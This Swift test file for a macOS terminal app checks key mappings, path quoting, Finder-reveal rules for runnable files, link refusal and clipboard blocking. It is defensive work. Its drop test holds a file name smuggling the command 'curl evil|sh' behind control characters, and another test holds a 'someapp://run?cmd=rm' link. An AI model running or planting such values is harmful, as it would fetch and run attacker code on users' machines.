import AppKit
import Foundation
import SwiftTerm
import Testing
@testable import Screens

@MainActor
@Suite("终端键位")
struct TerminalKeyTests {
    private func key(_ code: UInt16, _ flags: NSEvent.ModifierFlags, _ chars: String = "") -> NSEvent {
        NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: flags, timestamp: 0, windowNumber: 0, context: nil,
                         characters: chars, charactersIgnoringModifiers: chars, isARepeat: false, keyCode: code)!
    }

    @Test func mappings() {
        #expect(TerminalKeys.bytes(for: key(36, .shift, "\r"), cli: .claude) == [0x0a])
        #expect(TerminalKeys.bytes(for: key(36, .shift, "\r"), cli: nil) == nil)          // 普通终端不改 ⇧Return
        #expect(TerminalKeys.bytes(for: key(123, .command), cli: .claude) == [0x01])
        #expect(TerminalKeys.bytes(for: key(124, .command), cli: nil) == [0x05])
        #expect(TerminalKeys.bytes(for: key(51, .command), cli: .codex) == [0x15])
        #expect(TerminalKeys.bytes(for: key(123, .option), cli: .claude) == [0x1b, 0x62])
        #expect(TerminalKeys.bytes(for: key(51, .option), cli: .claude) == [0x1b, 0x7f])
        #expect(TerminalKeys.bytes(for: key(6, .command, "z"), cli: .claude) == [0x1f])
        #expect(TerminalKeys.bytes(for: key(6, .command, "z"), cli: .codex) == nil)       // Codex 不支持撤销
        #expect(TerminalKeys.bytes(for: key(36, [], "\r"), cli: .claude) == nil)          // 普通回车交给终端
        #expect(TerminalKeys.bytes(for: key(123, [.command, .shift]), cli: .claude) == nil) // ⇧⌘← 选择，不拦
    }
}

@MainActor
@Suite("⌘-click 路径")
struct LinkTests {
    @Test("拖进来的文件名带控制字符（回车、Ctrl-U、Esc）不输入：会被终端当成按键执行")
    func droppedPathsRejectControlCharacters() {
        #expect(TerminalDrop.text(for: ["/tmp/a b/it's.txt", "/tmp/c"]) == "'/tmp/a b/it'\\''s.txt' /tmp/c ")
        #expect(TerminalDrop.text(for: ["/tmp/a\u{15}curl evil|sh\r"]) == nil)
        #expect(TerminalDrop.text(for: ["/tmp/ok", "/tmp/\u{1b}[31m"]) == nil)
        #expect(TerminalDrop.text(for: ["/tmp/del\u{7f}"]) == nil)
        #expect(TerminalDrop.text(for: ["/tmp/中文 名字.md"]) == "'/tmp/中文 名字.md' ")
    }

    @Test("会运行东西 / 会跳到别处的不打开，只在访达里显示")
    func revealsRunnableThings() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sb-reveal-\(UUID())")
        defer { try? FileManager.default.removeItem(at: dir) }
        for sub in ["Helper.app/Contents", "Flow.workflow/Contents", "plain folder"] {
            try FileManager.default.createDirectory(at: dir.appendingPathComponent(sub), withIntermediateDirectories: true)
        }
        for name in ["setup.terminal", "run.command", "site.webloc", "evil.inetloc", "x.fileloc", "install.pkg", "profile.mobileconfig",
                     "a.scpt", "notes.md", "main.swift", "shot.png"] {
            try "x".write(to: dir.appendingPathComponent(name), atomically: true, encoding: .utf8)
        }
        let reveal = { (name: String) in LinkOpener.revealsInsteadOfOpening(dir.appendingPathComponent(name).path) }
        #expect(reveal("Helper.app"))
        #expect(reveal("Flow.workflow"))
        for name in ["setup.terminal", "run.command", "site.webloc", "evil.inetloc", "x.fileloc", "install.pkg", "profile.mobileconfig", "a.scpt"] {
            #expect(reveal(name), "\(name)")
        }
        #expect(!reveal("plain folder"))
        #expect(!reveal("notes.md") && !reveal("main.swift") && !reveal("shot.png"))
        // 看着是文本、其实是指向会运行的文件的符号链接：按它指向的算
        try FileManager.default.createSymbolicLink(at: dir.appendingPathComponent("README.txt"),
                                                   withDestinationURL: dir.appendingPathComponent("setup.terminal"))
        #expect(reveal("README.txt"))
    }

    @Test("系统默认打开它的是会运行它的程序（Python Launcher、终端、脚本编辑器）：只显示")
    func runnerApps() {
        #expect(LinkOpener.isRunner("org.python.PythonLauncher"))
        #expect(LinkOpener.isRunner("com.apple.Terminal"))
        #expect(LinkOpener.isRunner("com.apple.ScriptEditor2"))
        #expect(!LinkOpener.isRunner("com.apple.TextEdit"))
        #expect(!LinkOpener.isRunner("com.microsoft.VSCode"))
        #expect(!LinkOpener.isRunner(nil))
    }

    @Test func resolve() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sb-link-\(UUID())")
        try FileManager.default.createDirectory(at: dir.appendingPathComponent("Sources"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let file = dir.appendingPathComponent("Sources/main.swift")
        try "x".write(to: file, atomically: true, encoding: .utf8)
        let base = (dir.path as NSString).standardizingPath
        #expect(LinkOpener.resolve("Sources/main.swift:42", directory: dir.path)?.0 == base + "/Sources/main.swift")
        #expect(LinkOpener.resolve("Sources/main.swift:42", directory: dir.path)?.1 == 42)
        #expect(LinkOpener.resolve("Sources/main.swift:42:7", directory: dir.path)?.1 == 42)
        #expect(LinkOpener.resolve(file.path, directory: "/")?.1 == nil)
        #expect(LinkOpener.resolve("nope.swift", directory: dir.path) == nil)
    }

    @Test("预览里的链接也走这套：只放行网址，别的协议不交给系统；会运行的文件只显示")
    func linkTargets() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sb-target-\(UUID())")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        for name in ["setup.terminal", "notes.md"] {
            try "x".write(to: dir.appendingPathComponent(name), atomically: true, encoding: .utf8)
        }
        let base = (dir.path as NSString).standardizingPath
        let target = { (link: String, remote: Bool) in LinkOpener.target(for: link, relativeTo: dir.path, remote: remote) }
        #expect(target("https://example.com/a", false) == .web(URL(string: "https://example.com/a")!))
        #expect(target("https://example.com/a", true) == .web(URL(string: "https://example.com/a")!))
        // 系统设置、第三方 app 的自定义协议：一律不打开
        #expect(target("x-apple.systempreferences:com.apple.preference.security", false) == .refuse)
        #expect(target("someapp://run?cmd=rm", false) == .refuse)
        #expect(target("file://\(base)/setup.terminal", false) == .reveal(base + "/setup.terminal"))
        #expect(target("file://\(base)/notes.md", false) == .file(base + "/notes.md", line: nil))
        #expect(target("notes.md:3", false) == .file(base + "/notes.md", line: 3))
        #expect(target("notes.md", false) == .file(base + "/notes.md", line: nil))
        // 主机会话里的路径在这台 Mac 上不打开
        #expect(target("file://\(base)/notes.md", true) == .refuse)
    }
}

@MainActor
@Suite("切标签 · 认领 · 关闭偏好")
struct TabNavigationTests {
    private func store() -> WorkspaceStore {
        let tabs = (0..<3).map { TerminalTab(kind: .plainTerminal, projectPath: "/p", title: "t\($0)", activity: .idle) }
        let s = WorkspaceStore(hosts: [MockData.local], projects: [], sessions: [],
                               tabGroups: [TabGroup(projectID: "local:/p", name: "p", tint: 0, tabs: tabs, isCollapsed: true)])
        return s
    }

    @Test func numbered() {
        let s = store()
        s.selectTab(at: 1)
        #expect(s.selectedTab?.title == "t1")
        #expect(s.tabGroups[0].isCollapsed == false)       // 选到折叠组里的标签会展开
        s.selectTab(at: -1)
        #expect(s.selectedTab?.title == "t2")
        s.selectTab(at: 7)                                 // 没有第 8 个：不动
        #expect(s.selectedTab?.title == "t2")
    }

    @Test func cycle() {
        let s = store()
        s.cycleTab(1)
        #expect(s.selectedTab?.title == "t0")              // 预览里按下一个 → 第一个
        s.cycleTab(-1)
        #expect(s.selectedTab?.title == "t2")              // 回绕
        s.cycleTab(1)
        #expect(s.selectedTab?.title == "t0")
    }

    @Test("新会话标签认领目录里之后出现的同类会话")
    func claim() {
        let tab = TerminalTab(kind: .session(id: "new-x", cli: .claude), projectPath: "/work/app", title: "新的 Claude Code 会话", activity: .working)
        let start = Date()
        let s = WorkspaceStore(hosts: [MockData.local], projects: [], sessions: [
            Session(id: "old", cli: .claude, hostID: Host.localID, projectPath: "/work/app", title: "旧的", lastActivity: start.addingTimeInterval(-3600), messageCount: 1),
            Session(id: "other", cli: .codex, hostID: Host.localID, projectPath: "/work/app", title: "别的 CLI", lastActivity: start.addingTimeInterval(10), messageCount: 1),
            Session(id: "fresh", cli: .claude, hostID: Host.localID, projectPath: "/work/app/", title: "修登录页", lastActivity: start.addingTimeInterval(8), messageCount: 2),
        ], tabGroups: [TabGroup(projectID: "local:/work/app", name: "app", tint: 0, tabs: [tab])])
        s.pendingClaims[tab.id] = PendingClaim(cli: .claude, folder: "/work/app", startedAt: start)
        s.claimNewSessions()
        #expect(s.tab(tab.id)?.kind == .session(id: "fresh", cli: .claude))
        #expect(s.tab(tab.id)?.title == "修登录页")
        #expect(s.pendingClaims.isEmpty)
    }

    @Test("关闭偏好按主机记")
    func closePreference() {
        let host = "test-host-\(UUID().uuidString.prefix(6))"
        #expect(WorkspaceStore.closeBehavior(for: host) == "ask")
        WorkspaceStore.setCloseBehavior("keep", for: host)
        #expect(WorkspaceStore.closeBehavior(for: host) == "keep")
        UserDefaults.standard.removeObject(forKey: "closeBehavior.\(host)")
    }
}

@Suite struct ExitStatusTests {
    @Test func rawWaitStatusBecomesExitCode() {
        #expect(ExitStatus.code(fromWaitStatus: 0) == 0)
        #expect(ExitStatus.code(fromWaitStatus: 7 << 8) == 7)
        #expect(ExitStatus.code(fromWaitStatus: 255 << 8) == 255)     // ssh 断线，要能触发自动重连
        #expect(ExitStatus.code(fromWaitStatus: 9) == 137)            // SIGKILL
        #expect(ExitStatus.code(fromWaitStatus: nil) == 0)
    }
}

@MainActor
@Suite("终端剪贴板")
struct ClipboardGuardTests {
    private final class Recorder: LocalProcessTerminalViewDelegate {
        var title: String?
        func sizeChanged(source: LocalProcessTerminalView, newCols: Int, newRows: Int) {}
        func setTerminalTitle(source: LocalProcessTerminalView, title: String) { self.title = title }
        func hostCurrentDirectoryUpdate(source: TerminalView, directory: String?) {}
        func processTerminated(source: TerminalView, exitCode: Int32?) {}
    }

    @Test("终端里的程序读不到剪贴板（OSC 52），别的回调照常")
    func programsCannotReadClipboard() throws {
        let view = SBTerminalView(frame: NSRect(x: 0, y: 0, width: 400, height: 200), cli: nil, directory: "/", isRemote: true)
        let delegate = try #require(view.terminalDelegate)
        #expect(delegate !== view)
        #expect(delegate.clipboardRead(source: view) == nil)
        // 标题还是传到 processDelegate（Codex 在标题里报状态，不能断）
        let recorder = Recorder()
        view.processDelegate = recorder
        delegate.setTerminalTitle(source: view, title: "working")
        #expect(recorder.title == "working")
    }
}
